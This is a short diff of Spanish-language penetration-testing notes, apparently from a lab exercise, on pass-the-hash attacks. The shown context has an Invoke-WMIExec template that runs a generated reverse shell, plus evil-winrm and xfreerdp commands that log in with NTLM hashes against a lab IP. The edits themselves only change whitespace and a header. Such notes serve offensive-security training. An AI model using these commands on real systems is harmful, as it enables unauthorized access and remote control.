@@ -38,7 +38,7 @@ creamos la reverse shell:
 
         https://www.revshells.com/:
 
-        
+
 
         Invoke-WMIExec -Target <hostname/ip> -Domain <domain> -Username <username> -Hash <hash> -Command "<reverse_shell_generada>"
 
@@ -60,5 +60,5 @@ tambien podemos buscarlo con local accounts:
 
         evil-winrm -i 10.129.201.126 -u Administrator -H 30B3783CE2ABF1AF70F77D0660CF3453
 
-#####RDP:
-xfreerdp  /v:10.129.201.126 /u:julio /pth:64F12CDDAA88057E06A81B54E73B949B
+#### DP:
+        xfreerdp  /v:10.129.201.126 /u:julio /pth:64F12CDDAA88057E06A81B54E73B949B
